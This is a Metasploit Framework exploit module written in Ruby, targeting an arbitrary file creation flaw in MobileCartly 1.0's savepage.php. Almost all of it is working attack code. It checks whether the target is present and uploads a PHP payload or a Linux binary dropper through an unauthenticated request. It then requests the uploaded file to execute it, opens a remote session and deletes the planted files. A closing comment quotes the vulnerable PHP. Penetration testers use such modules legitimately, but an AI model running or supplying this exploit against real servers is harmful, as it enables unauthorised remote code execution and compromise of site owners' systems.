##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::EXE

	def initialize(info={})
		super(update_info(info,
			'Name'           => "MobileCartly 1.0 Arbitrary File Creation Vulnerability",
			'Description'    => %q{
				This module exploits a vulnerability in MobileCartly.  The savepage.php file
				does not do any permission checks before using file_put_contents(), which
				allows any user to have direct control of that function to create files
				under the 'pages' directory by default, or anywhere else as long as the user
				has WRITE permission.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Yakir Wizman <yakir.wizman[at]gmail.com>', #Original discovery
					'sinn3r' #Metasploit
				],
			'References'     =>
				[
					['EDB', '20422']
				],
			'Payload'        =>
				{
					'BadChars' => "\x00"
				},
			'DefaultOptions'  =>
				{
					'ExitFunction' => "none"
				},
			'Platform'       => ['linux', 'php'],
			'Targets'        =>
				[
					[ 'Generic (PHP Payload)', { 'Arch' => ARCH_PHP, 'Platform' => 'php' }  ],
					[ 'Linux x86'            , { 'Arch' => ARCH_X86, 'Platform' => 'linux'} ]
				],
			'Privileged'     => false,
			'DisclosureDate' => "Aug 10 2012",
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('TARGETURI', [true, 'The base directory to MobileCartly', '/mobilecartly/'])
			], self.class)
	end


	def check
		target_uri.path << '/' if target_uri.path[-1,1] != '/'
		base = File.dirname("#{target_uri.path}.")

		res = send_request_raw({'uri'=>"#{base}/index.php"})
		if res and res.body =~ /MobileCartly/
			return Exploit::CheckCode::Detected
		else
			return Exploit::CheckCode::Safe
		end
	end


	def get_write_exec_payload(fname, data)
		p = Rex::Text.encode_base64(generate_payload_exe)
		php = %Q|
		<?php
		$f = fopen("#{fname}", "wb");
		fwrite($f, base64_decode("#{p}"));
		fclose($f);
		exec("chmod 777 #{fname}");
		exec("#{fname}");
		?>
		|
		php = php.gsub(/^\t\t/, '').gsub(/\n/, ' ')
		return php
	end


	def on_new_session(cli)
		if cli.type == "meterpreter"
			cli.core.use("stdapi") if not cli.ext.aliases.include?("stdapi")
		end

		@clean_files.each do |f|
			print_status("#{@peer} - Removing: #{f}")
			begin
				if cli.type == 'meterpreter'
					cli.fs.file.rm(f)
				else
					cli.shell_command_token("rm #{f}")
				end
			rescue ::Exception => e
				print_error("#{@peer} - Unable to remove #{f}: #{e.message}")
			end
		end
	end


	def exploit
		@peer = "#{rhost}:#{rport}"

		#
		# Init target path
		#
		target_uri.path << '/' if target_uri.path[-1,1] != '/'
		base = File.dirname("#{target_uri.path}.")

		#
		# Configure payload names
		#
		php_fname = Rex::Text.rand_text_alpha(5) + ".php"
		bin_fname = Rex::Text.rand_text_alpha(5)
		@clean_files = [php_fname]

		#
		# Generate a payload based on target
		#
		case target['Platform']
		when 'php'
			p = "<?php #{payload.encoded} ?>"
		when 'linux'
			bin_fname << '.bin'
			@clean_files << bin_fname
			bin = generate_payload_exe
			p = get_write_exec_payload("/tmp/#{bin_fname}", bin)
		end

		#
		# Upload payload
		#
		print_status("#{@peer} - Uploading payload (#{p.length.to_s} bytes)")
		res = send_request_cgi({
			'uri' => "#{base}/includes/savepage.php",
			'vars_get' => {
				'savepage'    => php_fname,
				'pagecontent' => p
			}
		})

		if not res
			print_error("#{@peer} - No response from server, will not continue.")
			return
		end

		#
		# Run payload
		#
		print_status("#{@peer} - Requesting '#{php_fname}'")
		send_request_raw({'uri' => "#{base}/pages/#{php_fname}"})

		handler
	end
end

=begin
*facepalm*

<?php
	$page = "../pages/" . $_REQUEST['savepage'];
	$content = $_REQUEST['pagecontent'];
	file_put_contents($page, $content);
?>
=end